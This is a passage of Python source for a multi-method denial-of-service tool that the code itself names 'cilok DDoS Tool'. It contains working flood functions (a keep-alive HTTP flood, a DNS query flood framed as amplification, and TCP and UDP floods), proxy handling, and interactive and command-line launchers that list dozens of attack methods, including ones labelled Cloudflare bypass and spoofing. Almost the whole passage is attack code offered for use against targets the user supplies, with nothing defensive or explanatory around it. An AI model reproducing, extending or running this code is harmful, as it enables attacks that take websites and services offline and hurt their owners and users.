    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackRUDEAD, args=(target, until, stats, delay, timeout)).start()

def AttackRUDEAD(target, until_datetime, stats, delay, timeout):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            path = "/" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5,20)))
            req = (f"GET {path} HTTP/1.1\r\nHost: {target['host']}\r\n"
                   f"User-Agent: {random.choice(ua)}\r\n"
                   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                   "Connection: Keep-Alive\r\n\r\n")
            s.send(req.encode())
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1
            s.close()
            return


try:
    import dns.message, dns.rdatatype, dns.edns
    def LaunchDNS_AMP(url, th, t, stats=None, delay=0.1, timeout=10):
      
        until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
        domain = "example.com"
        query = dns.message.make_query(domain, dns.rdatatype.A)
        query.use_edns(edns=True, payload=4096, options=[dns.edns.GenericOption(8, b'\x00\x01')])
        wire = query.to_wire()
        for _ in range(int(th)):
            threading.Thread(target=AttackDNS_AMP, args=(url, 53, wire, until, stats, timeout)).start()

    def AttackDNS_AMP(host, port, wire, until_datetime, stats, timeout):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                s.sendto(wire, (host, port))
                if stats: stats['total'] += 1
                random_small_delay(0.01, 0.05)
            except:
                if stats: stats['errors'] += 1
                s.close()
                return
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    print("[*] dnspython not installed. DNS amplification disabled.")


def runflooder(host, port, th, t, stats=None, timeout=10):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(1024)
    for _ in range(int(th)):
        threading.Thread(target=flooder_tcp, args=(host, port, rand, until, stats, timeout)).start()

def flooder_tcp(host, port, rand, until_datetime, stats, timeout):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, int(port)))
            for _ in range(5):
                s.send(rand)
            s.close()
            if stats: stats['total'] += 1
        except:
            if stats: stats['errors'] += 1

def runsender(host, port, th, t, stats=None, payload="", timeout=10):
    if not payload:
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=sender_udp, args=(host, port, until, payload, stats, timeout)).start()

def sender_udp(host, port, until_datetime, payload, stats, timeout):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            s.sendto(payload, (host, int(port)))
            if stats: stats['total'] += 1
        except:
            if stats: stats['errors'] += 1
            s.close()
            return

def get_info_l7():
    target = input("URL      : ")
    thread = input("THREAD   : ")
    t = input("TIME(s)  : ")
    delay = input("Delay (s, default 0.1): ") or "0.1"
    timeout = input("Timeout (s, default 10): ") or "10"
    return target, thread, t, float(delay), int(timeout)

def get_info_l4():
    target = input("IP       : ")
    port = input("PORT     : ")
    thread = input("THREAD   : ")
    t = input("TIME(s)  : ")
    timeout = input("Timeout (s, default 10): ") or "10"
    return target, port, thread, t, int(timeout)

def show_help():
    print("\nAvailable commands:")
    print("  l7 methods: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2,")
    print("              get, post, head, soc, pxraw, pxsoc, pps, spoof, pxspoof,")
    print("              slowloris, slowread, r-u-dead, cache-bypass, broken-auth,")
    print("              conn-exhaust, http2-large, http2-range, dns-amp")
    print("  l4 methods: udp, tcp")
    print("  tools: dns, geoip, subnet")
    print("  other: clear, exit, help")
    print()

def interactive():
    load_user_agents()
    global proxies
    proxy_file = input("Proxy file (enter to skip): ").strip()
    if proxy_file:
        load_proxies(proxy_file)
    else:
        proxies = []
    while True:
        try:
            cmd = input("cilok> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print("\nExiting.")
            break

        if not cmd:
            continue

        if cmd in ("exit", "quit"):
            break
        elif cmd in ("clear", "cls"):
            os.system('clear' if os.name != 'nt' else 'cls')
        elif cmd in ("help", "?"):
            show_help()
        else:
            
            parts = cmd.split()
            method = parts[0]
            if method in ("http2", "pxhttp2", "cfb", "pxcfb", "pps", "spoof", "pxspoof",
                          "get", "post", "head", "pxraw", "soc", "pxsoc", "cfreq", "cfsoc",
                          "pxsky", "sky", "slowloris", "slowread", "r-u-dead", "cache-bypass",
                          "broken-auth", "conn-exhaust", "http2-large", "http2-range", "dns-amp"):
                target, thread, t, delay, timeout = get_info_l7()
                stats = {'total':0, 'errors':0}
                threading.Thread(target=countdown_with_stats, args=(t, stats)).start()
                if method == "http2":
                    LaunchHTTP2(target, thread, t, stats, delay, timeout)
                elif method == "pxhttp2":
                    if not proxies:
                        print("[*] No proxies loaded.")
                        continue
                    LaunchPXHTTP2(target, thread, t, stats, delay, timeout)
                elif method == "cfb":
                    LaunchCFB(target, thread, t, stats, delay, timeout)
                elif method == "pxcfb":
                    if not proxies:
                        print("[*] No proxies loaded.")
                        continue
                    LaunchPXCFB(target, thread, t, stats, delay, timeout)
                elif method == "pps":
                    LaunchPPS(target, thread, t, stats, delay, timeout)
                elif method == "spoof":
                    LaunchSPOOF(target, thread, t, stats, delay, timeout)
                elif method == "pxspoof":
                    socks5 = get_proxylist("SOCKS5")
                    if not socks5:
                        print("[*] No SOCKS5 proxies found.")
                        continue
                    LaunchPXSPOOF(target, thread, t, socks5, stats, delay, timeout)
                elif method == "get":
                    LaunchRAW(target, thread, t, stats, delay, timeout)
                elif method == "post":
                    LaunchPOST(target, thread, t, stats, delay, timeout)
                elif method == "head":
                    LaunchHEAD(target, thread, t, stats, delay, timeout)
                elif method == "pxraw":
                    if not proxies:
                        print("[*] No proxies loaded.")
                        continue
                    LaunchPXRAW(target, thread, t, stats, delay, timeout)
                elif method == "soc":
                    LaunchSOC(target, thread, t, stats, delay, timeout)
                elif method == "pxsoc":
                    if not proxies:
                        print("[*] No proxies loaded.")
                        continue
                    LaunchPXSOC(target, thread, t, stats, delay, timeout)
                elif method == "cfreq":
                    print("[*] Bypassing CF... (Max 60s per cookie)")
                    LaunchCFPRO(target, thread, t, stats, delay, timeout)
                elif method == "cfsoc":
                    print("[*] Bypassing CF... (Max 60s per cookie)")
                    LaunchCFSOC(target, thread, t, stats, delay, timeout)
                elif method == "pxsky":
                    if not proxies:
                        print("[*] No proxies loaded.")
                        continue
                    attackSKY(target, t, thread, stats, delay, timeout)
                elif method == "sky":
                    attackSTELLAR(target, t, thread, stats, delay, timeout)
                elif method == "slowloris":
                    LaunchSLOWLORIS(target, thread, t, stats, delay, timeout)
                elif method == "slowread":
                    LaunchSLOWREAD(target, thread, t, stats, delay, timeout)
                elif method == "r-u-dead":
                    LaunchRUDEAD(target, thread, t, stats, delay, timeout)
                elif method == "cache-bypass":
                    LaunchCACHE_BYPASS(target, thread, t, stats, delay, timeout)
                elif method == "broken-auth":
                    LaunchBROKEN_AUTH(target, thread, t, stats, delay, timeout)
                elif method == "conn-exhaust":
                    LaunchCONN_EXHAUST(target, thread, t, stats, delay, timeout)
                elif method == "http2-large":
                    LaunchHTTP2_LARGE(target, thread, t, stats, delay, timeout)
                elif method == "http2-range":
                    LaunchHTTP2_RANGE(target, thread, t, stats, delay, timeout)
                elif method == "dns-amp":
                    if not DNS_AVAILABLE:
                        print("[*] dnspython not installed. Install with: pip install dnspython")
                        continue
                    LaunchDNS_AMP(target, thread, t, stats, delay, timeout)
            elif method in ("udp", "tcp"):
                target, port, thread, t, timeout = get_info_l4()
                stats = {'total':0, 'errors':0}
                threading.Thread(target=countdown_with_stats, args=(t, stats)).start()
                if method == "udp":
                    runsender(target, port, thread, t, stats, timeout=timeout)
                else:
                    runflooder(target, port, thread, t, stats, timeout)
            elif method in ("subnet", "dns", "geoip"):
                # tools
                if method == "subnet":
                    target = input("IP : ")
                    try:
                        r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
                        print(r.text)
                    except:
                        print("Error.")
                elif method == "dns":
                    target = input("IP/DOMAIN : ")
                    try:
                        r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
                        print(r.text)
                    except:
                        print("Error.")
                elif method == "geoip":
                    target = input("IP : ")
                    try:
                        r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
                        print(r.text)
                    except:
                        print("Error.")
            else:
                print(f"Unknown command: {method}. Type 'help' for list.")


if __name__ == '__main__':
    load_user_agents()
    if len(sys.argv) == 1:
        interactive()
    else:
        import argparse
        parser = argparse.ArgumentParser(description="cilok DDoS Tool")
        parser.add_argument("method", help="Attack method")
        parser.add_argument("target", help="Target URL or IP")
        parser.add_argument("threads", type=int, help="Number of threads")
        parser.add_argument("time", type=int, help="Attack duration in seconds")
        parser.add_argument("--proxy-file", help="Proxy file (HTTP/HTTPS proxies)")
        parser.add_argument("--delay", type=float, default=0.1, help="Delay between requests (default 0.1)")
        parser.add_argument("--timeout", type=int, default=10, help="Connection timeout (default 10)")
        parser.add_argument("--port", type=int, help="Port for L4 attacks")
        args = parser.parse_args()

        if args.proxy_file:
            load_proxies(args.proxy_file)

        stats = {'total':0, 'errors':0}
        threading.Thread(target=countdown_with_stats, args=(args.time, stats)).start()

        method = args.method.lower()
        target = args.target
        threads = args.threads
        t = args.time
        delay = args.delay
        timeout = args.timeout

        
        if method == "get":
            LaunchRAW(target, threads, t, stats, delay, timeout)
        elif method == "post":
            LaunchPOST(target, threads, t, stats, delay, timeout)
        elif method == "head":
            LaunchHEAD(target, threads, t, stats, delay, timeout)
        elif method == "http2":
            LaunchHTTP2(target, threads, t, stats, delay, timeout)
        elif method == "pxhttp2":
            LaunchPXHTTP2(target, threads, t, stats, delay, timeout)
        elif method == "cfb":
            LaunchCFB(target, threads, t, stats, delay, timeout)
        elif method == "pxcfb":
            LaunchPXCFB(target, threads, t, stats, delay, timeout)
        elif method == "soc":
            LaunchSOC(target, threads, t, stats, delay, timeout)
        elif method == "pxsoc":
            LaunchPXSOC(target, threads, t, stats, delay, timeout)
        elif method == "pxraw":
            LaunchPXRAW(target, threads, t, stats, delay, timeout)
        elif method == "pps":
            LaunchPPS(target, threads, t, stats, delay, timeout)
        elif method == "spoof":
            LaunchSPOOF(target, threads, t, stats, delay, timeout)
        elif method == "pxspoof":
            socks5 = get_proxylist("SOCKS5")
            if socks5:
                LaunchPXSPOOF(target, threads, t, socks5, stats, delay, timeout)
            else:
                print("[*] No SOCKS5 proxies found.")
        elif method == "cfreq":
            print("[*] Bypassing CF... (Max 60s per cookie)")
            LaunchCFPRO(target, threads, t, stats, delay, timeout)
        elif method == "cfsoc":
            print("[*] Bypassing CF... (Max 60s per cookie)")
            LaunchCFSOC(target, threads, t, stats, delay, timeout)
        elif method == "sky":
            attackSTELLAR(target, t, threads, stats, delay, timeout)
        elif method == "pxsky":
            attackSKY(target, t, threads, stats, delay, timeout)
        elif method == "slowloris":
            LaunchSLOWLORIS(target, threads, t, stats, delay, timeout)
        elif method == "slowread":
            LaunchSLOWREAD(target, threads, t, stats, delay, timeout)
        elif method == "r-u-dead":
            LaunchRUDEAD(target, threads, t, stats, delay, timeout)
        elif method == "cache-bypass":
            LaunchCACHE_BYPASS(target, threads, t, stats, delay, timeout)
        elif method == "broken-auth":
            LaunchBROKEN_AUTH(target, threads, t, stats, delay, timeout)
        elif method == "conn-exhaust":
            LaunchCONN_EXHAUST(target, threads, t, stats, delay, timeout)
        elif method == "http2-large":
            LaunchHTTP2_LARGE(target, threads, t, stats, delay, timeout)
        elif method == "http2-range":
            LaunchHTTP2_RANGE(target, threads, t, stats, delay, timeout)
        elif method == "dns-amp":
            if not DNS_AVAILABLE:
                print("[*] dnspython not installed. Install with: pip install dnspython")
            else:
                LaunchDNS_AMP(target, threads, t, stats, delay, timeout)
        # L4 methods
        elif method in ("udp", "tcp"):
            if not args.port:
                print("[*] Please specify --port for L4 attacks.")
                sys.exit(1)
            if method == "udp":
                runsender(target, args.port, threads, t, stats, timeout=timeout)
            else:
                runflooder(target, args.port, threads, t, stats, timeout)
        else:
            print(f"Unknown method: {method}")
            print("Available: get, post, head, http2, pxhttp2, cfb, pxcfb, soc, pxsoc, pxraw, pps, spoof, pxspoof, cfreq, cfsoc, sky, pxsky, slowloris, slowread, r-u-dead, cache-bypass, broken-auth, conn-exhaust, http2-large, http2-range, dns-amp, udp, tcp")
